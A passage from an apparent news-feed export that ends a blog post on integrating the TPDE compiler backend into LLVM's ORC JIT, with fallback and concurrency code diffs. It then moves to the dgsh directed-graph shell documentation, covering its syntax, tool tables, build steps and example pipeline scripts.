&lt;/code&gt;
    &lt;p&gt;I’ve created a complete working demo on GitHub that you can try out. The code in the repo handles a few more details that we’ll explore shortly. Here’s what the output looks like:&lt;/p&gt;
    &lt;code&gt;&amp;gt; ./tpde-orc 01-basic.ll 
Loaded module: 01-basic.ll
Executing main()
Program returned: 0

&amp;gt; ./tpde-orc 01-basic.ll --entrypoint custom_entry
Loaded module: 01-basic.ll
Executing custom_entry()
Program returned: 123
&lt;/code&gt;
    &lt;p&gt;We can already see a 4x speedup with TPDE compared to built-in LLVM codegen for 100 repetitions with a large self-contained module that was generated with csmith:&lt;/p&gt;
    &lt;code&gt;&amp;gt; ./build/tpde-orc --par 1 tpde-orc/03-csmith-tpde.ll
...
Compile-time was: 2200 ms

&amp;gt; ./build/tpde-orc --par 1 tpde-orc/03-csmith-tpde.ll --llvm
...
Compile-time was: 8820 ms
&lt;/code&gt;
    &lt;head rend="h3"&gt;LLJITBuilder has a Catch&lt;/head&gt;
    &lt;p&gt;While &lt;code&gt;LLJITBuilder&lt;/code&gt; is convenient, it comes with a minor trade-off. The interface incorporates standard LLVM components including &lt;code&gt;TargetRegistry&lt;/code&gt;, which is perfectly reasonable for most use cases. However, this creates a dependency we might not want: the built-in LLVM target backend must be initialized first via &lt;code&gt;InitializeNativeTarget()&lt;/code&gt;. This means we still need to ship the LLVM backend, even though TPDE could theoretically replace it entirely.&lt;/p&gt;
    &lt;p&gt;If you want to avoid this dependency, you’ll need to set up your ORC JIT manually. For inspiration on this approach, check out how the &lt;code&gt;tpde-lli&lt;/code&gt; tool implements it. Before diving into that rabbit hole though, let’s explore another important aspect!&lt;/p&gt;
    &lt;head rend="h3"&gt;Implementing a LLVM Fallback&lt;/head&gt;
    &lt;p&gt;One reason why TPDE is so fast and compact is that it focusses on the most common use cases rather than covering every edge case in the LLVM instruction set. The documentation provides this guideline:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Code generated by Clang (-O0/-O1) will typically compile; -O2 and higher will typically fail due to unsupported vector operations.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;When your code includes advanced features like vector operations or non-trivial floating-point types, TPDE won’t be able to handle it. In these cases, we need a fallback to LLVM. Since this scenario is quite common in real-world applications, most tools will include both backends (and we can keep using &lt;code&gt;LLJITBuilder&lt;/code&gt;). Implementing the fallback is straightforward using ORC’s CompileUtils:&lt;/p&gt;
    &lt;code&gt;@@ -29,7 +29,8 @@ static cl::opt&amp;lt;std::string&amp;gt; EntryPoint("entrypoint",
 class TPDECompiler : public IRCompileLayer::IRCompiler {
 public:
   TPDECompiler(JITTargetMachineBuilder JTMB)
-      : IRCompiler(irManglingOptionsFromTargetOptions(JTMB.getOptions())) {
+      : IRCompiler(irManglingOptionsFromTargetOptions(JTMB.getOptions())),
+        JTMB(std::move(JTMB)) {
     Compiler = tpde_llvm::LLVMCompiler::create(JTMB.getTargetTriple());
     assert(Compiler != nullptr &amp;amp;&amp;amp; "Unknown architecture");
   }
@@ -37,9 +38,9 @@ Expected&amp;lt;std::unique_ptr&amp;lt;MemoryBuffer&amp;gt;&amp;gt; TPDECompiler::operator()(Module &amp;amp;M) {
   std::vector&amp;lt;uint8_t&amp;gt; &amp;amp;B = *Buffers.back();
 
   if (!Compiler-&amp;gt;compile_to_elf(M, B)) {
-    std::string Msg;
-    raw_string_ostream(Msg) &amp;lt;&amp;lt; "TPDE failed to compile: " &amp;lt;&amp;lt; M.getName();
-    return createStringError(std::move(Msg), inconvertibleErrorCode());
+    errs() &amp;lt;&amp;lt; "Falling back to LLVM for module: " &amp;lt;&amp;lt; M.getName() &amp;lt;&amp;lt; "\n";
+    auto TM = ExitOnErr(JTMB.createTargetMachine());
+    return SimpleCompiler(*TM)(M);
   }
 
   StringRef BufferRef{reinterpret_cast&amp;lt;char *&amp;gt;(B.data()), B.size()};
@@ -50,6 +51,7 @@ public:
 private:
   std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
   std::vector&amp;lt;std::unique_ptr&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;&amp;gt; Buffers;
+  JITTargetMachineBuilder JTMB;
 };
 
 int main(int argc, char *argv[]) {
&lt;/code&gt;
    &lt;p&gt;Let’s test our fallback mechanism with the following IR file that uses an unsupported type:&lt;/p&gt;
    &lt;code&gt;@const_val = global bfloat 0xR4248

define i32 @main() {
entry:
  %c = load bfloat, ptr @const_val
  %i = fptosi bfloat %c to i32
  ret i32 %i
}
&lt;/code&gt;
    &lt;p&gt;Here’s what happens when we run it:&lt;/p&gt;
    &lt;code&gt;&amp;gt; ./tpde-orc 02-bfloat.ll
Loaded module: 02-bfloat.ll
[2025-09-25 12:54:03.076] [error] unsupported type: bfloat
[2025-09-25 12:54:03.076] [error] Failed to compile function main
Falling back to LLVM for module: 02-bfloat.ll
Executing main()
Program returned: 50
&lt;/code&gt;
    &lt;p&gt;In this implementation, we create a new &lt;code&gt;SimpleCompiler&lt;/code&gt; instance for each fallback case. While this adds some overhead, it’s acceptable since we’re already on the slow path. The key assumption is that most code in your workload will successfully compile with TPDE — if that’s not the case, then TPDE might not be the right choice in the first place. Interestingly, this approach has a valuable side-effect that becomes important in the next section: it’s inherently thread-safe!&lt;/p&gt;
    &lt;head rend="h3"&gt;Adding Concurrent Compilation Support&lt;/head&gt;
    &lt;p&gt;ORC JIT has built-in support for concurrent compilation. This is neat, but it requires attention when customizing the JIT. Our current setup uses a single &lt;code&gt;TPDECompiler&lt;/code&gt; instance, but TPDE’s &lt;code&gt;compile_to_elf()&lt;/code&gt; method isn’t thread-safe. Enabling concurrent compilation would cause multiple threads to call this method simultaneously, leading to failures.&lt;/p&gt;
    &lt;p&gt;How can we solve this? One option would be creating a new &lt;code&gt;tpde_llvm::LLVMCompiler&lt;/code&gt; instance for each compilation job, but that adds an overhead of &lt;code&gt;O(#jobs)&lt;/code&gt; — not ideal for our fast path. Essentially, we want to avoid calling into &lt;code&gt;compile_to_elf()&lt;/code&gt; while there is another call in-flight on the same thread. We can achieve this easily by making the &lt;code&gt;TPDECompiler&lt;/code&gt; instance thread-local, reducing the overhead to just &lt;code&gt;O(#threads)&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;@@ -32,7 +32,6 @@ public:
   TPDECompiler(JITTargetMachineBuilder JTMB)
       : IRCompiler(irManglingOptionsFromTargetOptions(JTMB.getOptions())),
         JTMB(std::move(JTMB)) {
-    Compiler = tpde_llvm::LLVMCompiler::create(JTMB.getTargetTriple());
     assert(Compiler != nullptr &amp;amp;&amp;amp; "Unknown architecture");
   }
 
@@ -50,11 +49,14 @@ public:
   }
 
 private:
-  std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
+  static thread_local std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
   std::vector&amp;lt;std::unique_ptr&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;&amp;gt; Buffers;
   JITTargetMachineBuilder JTMB;
 };
 
+thread_local std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; TPDECompiler::Compiler =
+    tpde_llvm::LLVMCompiler::create(Triple(LLVM_HOST_TRIPLE));
+
 int main(int argc, char *argv[]) {
   InitLLVM X(argc, argv);
   cl::ParseCommandLineOptions(argc, argv, "TPDE ORC JIT Compiler\n");
&lt;/code&gt;
    &lt;p&gt;We also need to guard access to our underlying buffers:&lt;/p&gt;
    &lt;code&gt;@@ -35,15 +35,19 @@ public:
   }
 
   Expected&amp;lt;std::unique_ptr&amp;lt;MemoryBuffer&amp;gt;&amp;gt; operator()(Module &amp;amp;M) override {
-    Buffers.push_back(std::make_unique&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;());
-    std::vector&amp;lt;uint8_t&amp;gt; *B = *Buffers.back().get();
+    std::vector&amp;lt;uint8_t&amp;gt; *B;
+    {
+      std::lock_guard&amp;lt;std::mutex&amp;gt; Lock(BuffersAccess);
+      Buffers.push_back(std::make_unique&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;());
+      B = Buffers.back().get();
+    }
 
     if (!Compiler-&amp;gt;compile_to_elf(M, *B)) {
       errs() &amp;lt;&amp;lt; "Falling back to LLVM for module: " &amp;lt;&amp;lt; M.getName() &amp;lt;&amp;lt; "\n";
@@ -50,6 +54,7 @@ public:
 private:
   static thread_local std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
   std::vector&amp;lt;std::unique_ptr&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;&amp;gt; Buffers;
+  std::mutex BuffersAccess;
   JITTargetMachineBuilder JTMB;
 };

&lt;/code&gt;
    &lt;p&gt;With thread safety handled, we can now enable concurrent compilation:&lt;/p&gt;
    &lt;code&gt;@@ -27,6 +27,10 @@ static cl::opt&amp;lt;std::string&amp;gt; EntryPoint("entrypoint",
                                       cl::desc("Entry point function name"),
                                       cl::init("main"));

+static cl::opt&amp;lt;unsigned&amp;gt;
+    Threads("par", cl::desc("Compile csmith code on N threads concurrently"),
+            cl::init(0));
+
class TPDECompiler : public IRCompileLayer::IRCompiler {
public:
@@ -65,6 +65,8 @@ int main(int argc, char *argv[]) {
       -&amp;gt; Expected&amp;lt;std::unique_ptr&amp;lt;IRCompileLayer::IRCompiler&amp;gt;&amp;gt; {
     return std::make_unique&amp;lt;TPDECompiler&amp;gt;(JTMB);
   };
+  Builder.SupportConcurrentCompilation = true;
+  Builder.NumCompileThreads = Threads;
   std::unique_ptr&amp;lt;LLJIT&amp;gt; JIT = ExitOnErr(Builder.create());
 
   ThreadSafeModule TSM(std::move(Mod), std::move(Context));
&lt;/code&gt;
    &lt;head rend="h3"&gt;Exercising Concurrent Lookup&lt;/head&gt;
    &lt;p&gt;It needs a lot more support code to actually exercise concurrent compilation and do basic performance measurments. The complete sample project on GitHub has one possible implementation: after loading the input module, it creates 100 duplicates of it with different entry-point names and issues a single JIT lookup for all the entry-points at once. Here’s a simplified version of how this works:&lt;/p&gt;
    &lt;code&gt;SymbolMap SymMap;
SymbolLookupSet EntryPoints = addDuplicates(JIT, Mod);

outs() &amp;lt;&amp;lt; "Compiling " &amp;lt;&amp;lt; EntryPoints.size() &amp;lt;&amp;lt; " modules on " &amp;lt;&amp;lt; Threads
        &amp;lt;&amp;lt; " threads in parallel\n";

using namespace std::chrono;
auto ES = JIT-&amp;gt;getExecutionSession();
auto SO = makeJITDylibSearchOrder({JIT-&amp;gt;getMainJITDylib()});
auto Start = steady_clock::now();
{
  // Lookup all entry-points at once to execise concurrent compilation
  SymMap = ExitOnErr(ES.lookup(SO, EntryPoints));
}
auto End = steady_clock::now();
auto Elapsed = duration_cast&amp;lt;milliseconds&amp;gt;(End - Start);

outs() &amp;lt;&amp;lt; "Compile-time was: " &amp;lt;&amp;lt; Elapsed.count() &amp;lt;&amp;lt; " ms\n";
&lt;/code&gt;
    &lt;p&gt;Compile-times for our csmith example drop from ~2200ms to just ~740ms when utilizing 8 threads in parallel:&lt;/p&gt;
    &lt;code&gt;&amp;gt; ./tpde-orc --par 8 tpde-orc/03-csmith-tpde.ll
Load module: tpde-orc/03-csmith-tpde.ll
Compiling 100 modules on 8 threads in parallel
...
Compile-time was: 737 ms
&lt;/code&gt;
    &lt;head rend="h3"&gt;Et voilà!&lt;/head&gt;
    &lt;p&gt;Let’s wrap it up and appreciate the remarkable complexity that LLVM effortlessly handles in our little example. We parse a well-defined, human-readable representation of Turing-complete programs generated from various general-purpose languages like C++, Fortran, Rust, Swift, Julia, and Zig.&lt;/p&gt;
    &lt;p&gt;LLVM’s composable JIT engine seamlessly manages these parsed modules, automatically resolving symbols and dependencies. It compiles machine code in the native object format on-demand for multiple platforms and CPU architectures, while giving us complete control over the optimization pipeline, code generator (like our TPDE integration) and many more components. The engine then links everything into an executable form — all in-memory and without external tools or platform-specific dynamic library tricks! It’s really impressive that we can simply enable compilation on N threads in parallel and have it “just work” :-)&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://weliveindetail.github.io/blog/post/2025/09/30/tpde-in-llvm-orc.html"/><published>2025-09-30T10:51:45+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45424223</id><title>Orbiting the Hénon Attractor</title><updated>2025-09-30T17:09:36.558024+00:00</updated><content>&lt;doc fingerprint="20ed59e32d044a20"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;head rend="h3"&gt;Purpose-built for displays of data&lt;/head&gt;
      &lt;p&gt;Observable is your go-to platform for exploring data and creating expressive data visualizations. Use reactive JavaScript notebooks for prototyping and a collaborative canvas for visual data exploration and dashboard creation.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://observablehq.com/@yurivish/orbiting-the-henon-attractor"/><published>2025-09-30T11:31:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45425298</id><title>dgsh – Directed Graph Shell</title><updated>2025-09-30T17:09:34.793974+00:00</updated><content>&lt;doc fingerprint="577bba9067313cc8"&gt;
  &lt;main&gt;&lt;p&gt;The directed graph shell, dgsh (pronounced /dÃ¦É¡Ê/ — dagsh), provides an expressive way to construct sophisticated and efficient big data set and stream processing pipelines using existing Unix tools as well as custom-built components. It is a Unix-style shell (based on bash) allowing the specification of pipelines with non-linear non-uniform operations. These form a directed acyclic process graph, which is typically executed by multiple processor cores, thus increasing the operation's processing throughput.&lt;/p&gt;&lt;p&gt;If you want to get a feeling on how dgsh works in practice, skip right down to the examples section.&lt;/p&gt;&lt;p&gt; For a more formal introduction to dgsh or to cite it in your work, see:&lt;lb/&gt; Diomidis Spinellis and Marios Fragkoulis. Extending Unix Pipelines to DAGs. IEEE Transactions on Computers, 2017. doi: 10.1109/TC.2017.2695447 &lt;/p&gt;&lt;p&gt;Dgsh provides two new ways for expressing inter-process communication.&lt;/p&gt;&lt;code&gt;comm&lt;/code&gt; command supplied with dgsh
expects two input channels and produces on its output three
output channels: the lines appearing only in first (sorted) channel,
the lines appearing only in the second channel,
and the lines appearing in both.
Connecting the output of the &lt;code&gt;comm&lt;/code&gt; command to the
&lt;code&gt;cat&lt;/code&gt; command supplied with dgsh
will make the three outputs appear in sequence,
while connecting it to the
&lt;code&gt;paste&lt;/code&gt; command supplied with dgsh
will make the output appear in its customary format.
&lt;code&gt;md5sum&lt;/code&gt; and &lt;code&gt;wc -c&lt;/code&gt;
receives two inputs and produces two outputs:
the MD5 hash of its input and the input's size.
Data to multipipe blocks are typically provided with a
dgsh-aware version of &lt;code&gt;tee&lt;/code&gt; and collected by
dgsh-aware versions of programs such as
&lt;code&gt;cat&lt;/code&gt; and &lt;code&gt;paste&lt;/code&gt;.
&lt;code&gt;dgsh-writeval&lt;/code&gt;, and
a reader program, &lt;code&gt;dgsh-readval&lt;/code&gt;.
The behavior of a stored value's IO can be modified by adding flags to
&lt;code&gt;dgsh-writeval&lt;/code&gt; and &lt;code&gt;dgsh-readval&lt;/code&gt;.
&lt;p&gt;A dgsh script follows the syntax of a bash(1) shell script with the addition of multipipe blocks. A multipipe block contains one or more dgsh simple commands, other multipipe blocks, or pipelines of the previous two types of commands. The commands in a multipipe block are executed asynchronously (in parallel, in the background). Data may be redirected or piped into and out of a multipipe block. With multipipe blocks dgsh scripts form directed acyclic process graphs. It follows from the above description that multipipe blocks can be recursively composed.&lt;/p&gt;&lt;p&gt;As a simple example consider running the following command directly within dgsh&lt;/p&gt;&lt;quote&gt;{{ echo hello &amp;amp; echo world &amp;amp; }} | paste&lt;/quote&gt;&lt;p&gt; or by invoking &lt;code&gt;dgsh&lt;/code&gt; with the command as an argument.
&lt;/p&gt;&lt;quote&gt;dgsh -c '{{ echo hello &amp;amp; echo world &amp;amp; }} | paste'&lt;/quote&gt;&lt;p&gt; The command will run paste with input from the two echo processes to output &lt;code&gt;hello world&lt;/code&gt;.
This is equivalent to running the following bash command,
but with the flow of data appearing in the natural left-to-right order.
&lt;/p&gt;&lt;quote&gt;paste &amp;lt;(echo hello) &amp;lt;(echo world)&lt;/quote&gt;&lt;p&gt; In the following larger example, which compares the performance of different compression utilities, the script's standard input is distributed to three compression utilities (xz, bzip2, and gzip), to assess their performance, and also to file and wc to report the input data's type and size. The printf commands label the data of each processing type. All eight commands pass their output to the &lt;code&gt;cat&lt;/code&gt; command, which gathers their outputs
in order.
&lt;/p&gt;&lt;quote&gt;tee | {{ printf 'File type:\t' file - printf 'Original size:\t' wc -c printf 'xz:\t\t' xz -c | wc -c printf 'bzip2:\t\t' bzip2 -c | wc -c printf 'gzip:\t\t' gzip -c | wc -c }} | cat&lt;/quote&gt;&lt;p&gt; Formally, dgsh extends the syntax of the (modified) Unix Bourne-shell when &lt;code&gt;bash&lt;/code&gt; provided with the &lt;code&gt;--dgsh&lt;/code&gt; argument
as follows.
&lt;/p&gt;&lt;quote&gt;&amp;lt;dgsh_block&amp;gt; ::= '{{' &amp;lt;dgsh_list&amp;gt; '}}' &amp;lt;dgsh_list&amp;gt; ::= &amp;lt;dgsh_list_item&amp;gt; '&amp;amp;' &amp;lt;dgsh_list_item&amp;gt; &amp;lt;dgsh_list&amp;gt; &amp;lt;dgsh_list_item&amp;gt; ::= &amp;lt;simple_command&amp;gt; &amp;lt;dgsh_block&amp;gt; &amp;lt;dgsh_list_item&amp;gt; '|' &amp;lt;dgsh_list_item&amp;gt;&lt;/quote&gt;&lt;p&gt;A number of Unix tools have been adapted to support multiple inputs and outputs to match their natural capabilities. This echoes a similar adaptation that was performed in the early 1970s when Unix and the shell got pipes and the pipeline syntax. Many programs that worked with files were adjusted to work as filters. The number of input and output channels of dgsh-compatible commands are as follows, based on the supplied command-line arguments.&lt;/p&gt;&lt;table&gt;&lt;row span="4"&gt;&lt;cell role="head"&gt;Tool&lt;/cell&gt;&lt;cell role="head"&gt;Inputs&lt;/cell&gt;&lt;cell role="head"&gt;Outputs&lt;/cell&gt;&lt;cell role="head"&gt;Notes&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;cat (dgsh-tee)&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;0—M&lt;/cell&gt;&lt;cell&gt;No options are supported&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;cmp&lt;/cell&gt;&lt;cell&gt;0—2&lt;/cell&gt;&lt;cell&gt;0—1&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;comm&lt;/cell&gt;&lt;cell&gt;0—2&lt;/cell&gt;&lt;cell&gt;0—3&lt;/cell&gt;&lt;cell&gt;Output streams in order: lines only in first file, lines only in second one, and lines in both files&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;cut&lt;/cell&gt;&lt;cell&gt;0—1&lt;/cell&gt;&lt;cell&gt;1—N&lt;/cell&gt;&lt;cell&gt;With &lt;code&gt;--multistream&lt;/code&gt; output each range into a different stream&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;diff&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;cell&gt;Typically two inputs. Compare an arbitrary number of input streams with the &lt;code&gt;--from-file&lt;/code&gt; or &lt;code&gt;--to-file&lt;/code&gt; options&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;diff3&lt;/cell&gt;&lt;cell&gt;0—3&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;grep&lt;/cell&gt;&lt;cell&gt;0—2&lt;/cell&gt;&lt;cell&gt;0—4&lt;/cell&gt;&lt;cell&gt;Available output streams (via arguments): matching files, non-matching files, matching lines, and non-matching lines&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;join&lt;/cell&gt;&lt;cell&gt;0—2&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;paste&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;cell&gt;Paste N input streams&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;perm&lt;/cell&gt;&lt;cell&gt;1—N&lt;/cell&gt;&lt;cell&gt;1—N&lt;/cell&gt;&lt;cell&gt;Rearrange the order of N input streams&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;sort&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;0—1&lt;/cell&gt;&lt;cell&gt;With the &lt;code&gt;-m&lt;/code&gt; option, merge sort N input streams&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;tee (dgsh-tee)&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;0—M&lt;/cell&gt;&lt;cell&gt;Only the &lt;code&gt;-a&lt;/code&gt; option is supported&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;dgsh-readval&lt;/cell&gt;&lt;cell&gt;0&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;cell&gt;Read a value from a socket&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;dgsh-wrap&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;0—1&lt;/cell&gt;&lt;cell&gt;Wrap non-dgsh commands and negotiate on their behalf&lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;dgsh-writeval&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;cell&gt;0&lt;/cell&gt;&lt;cell&gt;Write a value to a socket&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt; In addition, POSIX user commands that receive no input or only generate no output, when executed in a dgsh context are wrapped to specify the corresponding input or output capability. For example, an &lt;code&gt;echo&lt;/code&gt; command in a multipipe block
will appear to receive no input, but will provide one output stream.
By default &lt;code&gt;dgsh&lt;/code&gt; automatically wraps all other
commands as filters.
&lt;/p&gt;&lt;p&gt;Finally, note that any dgsh script will accept and generate the number of inputs and outputs associated with the commands or multipipe blocks at its two endpoints.&lt;/p&gt;&lt;p&gt;The dgsh suite has been tested under Debian and Ubuntu Linux, FreeBSD, and Mac OS X. A Cygwin port is underway.&lt;/p&gt;&lt;p&gt;An installation of GraphViz will allow you to visualize the dgsh graphs that you specify in your programs.&lt;/p&gt;&lt;p&gt;To compile and run dgsh you will need to have the following commands installed on your system:&lt;/p&gt;&lt;quote&gt;make automake gcc libtool pkg-config texinfo help2man autopoint bison check gperf git xz-utils gettextTo test dgsh you will need to have the following commands installed in your system:&lt;/quote&gt;&lt;quote&gt;wbritish wamerican libfftw3-dev csh curl bzip2&lt;/quote&gt;&lt;p&gt;Go through the following steps.&lt;/p&gt;&lt;quote&gt;git clone --recursive https://github.com/dspinellis/dgsh.git&lt;/quote&gt;&lt;quote&gt;make config&lt;/quote&gt;&lt;quote&gt;make&lt;/quote&gt;&lt;quote&gt;sudo make install&lt;/quote&gt;&lt;p&gt; By default, the program and its documentation are installed under &lt;code&gt;/usr/local&lt;/code&gt;.
You can modify this by setting the &lt;code&gt;PREFIX&lt;/code&gt; variable
in the `config` step, for example:
&lt;/p&gt;&lt;quote&gt;make PREFIX=$HOME config make make install&lt;/quote&gt;&lt;p&gt;Issue the following command.&lt;/p&gt;&lt;quote&gt;make test&lt;/quote&gt;&lt;p&gt;To compile and run dgsh you will need to have the following packages installed in your system:&lt;/p&gt;&lt;quote&gt;devel/automake devel/bison devel/check devel/git devel/gmake devel/gperf misc/help2man print/texinfo shells/bashTo test dgsh you will need to have the following ports installed on your system:&lt;/quote&gt;&lt;quote&gt;archivers/bzip2 ftp/curl&lt;/quote&gt;&lt;p&gt;Go through the following steps.&lt;/p&gt;&lt;quote&gt;git clone --recursive https://github.com/dspinellis/dgsh.git&lt;/quote&gt;&lt;quote&gt;gmake config&lt;/quote&gt;&lt;quote&gt;gmake&lt;/quote&gt;&lt;quote&gt;sudo gmake install&lt;/quote&gt;&lt;p&gt; By default, the program and its documentation are installed under &lt;code&gt;/usr/local&lt;/code&gt;.
You can modify this by setting the &lt;code&gt;PREFIX&lt;/code&gt; variable
in the `config` step, for example:
&lt;/p&gt;&lt;quote&gt;gmake PREFIX=$HOME config gmake gmake install&lt;/quote&gt;&lt;p&gt;Issue the following command.&lt;/p&gt;&lt;quote&gt;gmake test&lt;/quote&gt;&lt;p&gt;These are the manual pages for dgsh, the associated helper programs and the API in formats suitable for browsing and printing. The commands are listed in the order of usefulness in everyday scenarios.&lt;/p&gt;&lt;p&gt;Report file type, length, and compression performance for data received from the standard input. The data never touches the disk. Demonstrates the use of an output multipipe to source many commands from one followed by an input multipipe to sink to one command the output of many and the use of dgsh-tee that is used both to propagate the same input to many commands and collect output from many commands orderly in a way that is transparent to users.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh tee | {{ printf 'File type:\t' file - printf 'Original size:\t' wc -c printf 'xz:\t\t' xz -c | wc -c printf 'bzip2:\t\t' bzip2 -c | wc -c printf 'gzip:\t\t' gzip -c | wc -c }} | cat&lt;/quote&gt;&lt;p&gt;Process the Git history, and list the authors and days of the week ordered by the number of their commits. Demonstrates streams and piping through a function.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh forder() { sort | uniq -c | sort -rn } git log --format="%an:%ad" --date=default "$@" | tee | {{ echo "Authors ordered by number of commits" # Order by frequency awk -F: '{print $1}' | forder echo "Days ordered by number of commits" # Order by frequency awk -F: '{print substr($2, 1, 3)}' | forder }} | cat&lt;/quote&gt;&lt;p&gt;Process a directory containing C source code, and produce a summary of various metrics. Demonstrates nesting, commands without input.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh {{ # C and header code find "$@" \( -name \*.c -or -name \*.h \) -type f -print0 | tee | {{ # Average file name length # Convert to newline separation for counting echo -n 'FNAMELEN: ' tr \\0 \\n | # Remove path sed 's|^.*/||' | # Maintain average awk '{s += length($1); n++} END { if (n&amp;gt;0) print s / n; else print 0; }' xargs -0 /bin/cat | tee | {{ # Remove strings and comments sed 's/#/@/g;s/\\[\\"'\'']/@/g;s/"[^"]*"/""/g;'"s/'[^']*'/''/g" | cpp -P | tee | {{ # Structure definitions echo -n 'NSTRUCT: ' egrep -c 'struct[ ]*{|struct[ ]*[a-zA-Z_][a-zA-Z0-9_]*[ ]*{' #}} (match preceding openings) # Type definitions echo -n 'NTYPEDEF: ' grep -cw typedef # Use of void echo -n 'NVOID: ' grep -cw void # Use of gets echo -n 'NGETS: ' grep -cw gets # Average identifier length echo -n 'IDLEN: ' tr -cs 'A-Za-z0-9_' '\n' | sort -u | awk '/^[A-Za-z]/ { len += length($1); n++ } END { if (n&amp;gt;0) print len / n; else print 0; }' }} # Lines and characters echo -n 'CHLINESCHAR: ' wc -lc | awk '{OFS=":"; print $1, $2}' # Non-comment characters (rounded thousands) # -traditional avoids expansion of tabs # We round it to avoid failing due to minor # differences between preprocessors in regression # testing echo -n 'NCCHAR: ' sed 's/#/@/g' | cpp -traditional -P | wc -c | awk '{OFMT = "%.0f"; print $1/1000}' # Number of comments echo -n 'NCOMMENT: ' egrep -c '/\*|//' # Occurences of the word Copyright echo -n 'NCOPYRIGHT: ' grep -ci copyright }} }} # C files find "$@" -name \*.c -type f -print0 | tee | {{ # Convert to newline separation for counting tr \\0 \\n | tee | {{ # Number of C files echo -n 'NCFILE: ' wc -l # Number of directories containing C files echo -n 'NCDIR: ' sed 's,/[^/]*$,,;s,^.*/,,' | sort -u | wc -l }} # C code xargs -0 /bin/cat | tee | {{ # Lines and characters echo -n 'CLINESCHAR: ' wc -lc | awk '{OFS=":"; print $1, $2}' # C code without comments and strings sed 's/#/@/g;s/\\[\\"'\'']/@/g;s/"[^"]*"/""/g;'"s/'[^']*'/''/g" | cpp -P | tee | {{ # Number of functions echo -n 'NFUNCTION: ' grep -c '^{' # Number of gotos echo -n 'NGOTO: ' grep -cw goto # Occurrences of the register keyword echo -n 'NREGISTER: ' grep -cw register # Number of macro definitions echo -n 'NMACRO: ' grep -c '@[ ]*define[ ][ ]*[a-zA-Z_][a-zA-Z0-9_]*(' # Number of include directives echo -n 'NINCLUDE: ' grep -c '@[ ]*include' # Number of constants echo -n 'NCONST: ' grep -ohw '[0-9][x0-9][0-9a-f]*' | wc -l }} }} }} # Header files echo -n 'NHFILE: ' find "$@" -name \*.h -type f | wc -l }} | # Gather and print the results cat&lt;/quote&gt;&lt;p&gt;List the names of duplicate files in the specified directory. Demonstrates the combination of streams with a relational join.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Create list of files find "$@" -type f | # Produce lines of the form # MD5(filename)= 811bfd4b5974f39e986ddc037e1899e7 xargs openssl md5 | # Convert each line into a "filename md5sum" pair sed 's/^MD5(//;s/)= / /' | # Sort by MD5 sum sort -k2 | tee | {{ # Print an MD5 sum for each file that appears more than once awk '{print $2}' | uniq -d # Promote the stream to gather it cat }} | # Join the repeated MD5 sums with the corresponding file names # Join expects two inputs, second will come from scatter # XXX make streaming input identifiers transparent to users join -2 2 | # Output same files on a single line awk ' BEGIN {ORS=""} $1 != prev &amp;amp;&amp;amp; prev {print "\n"} END {if (prev) print "\n"} {if (prev) print " "; prev = $1; print $2}'&lt;/quote&gt;&lt;p&gt;Highlight the words that are misspelled in the command's first argument. Demonstrates stream processing with multipipes and the 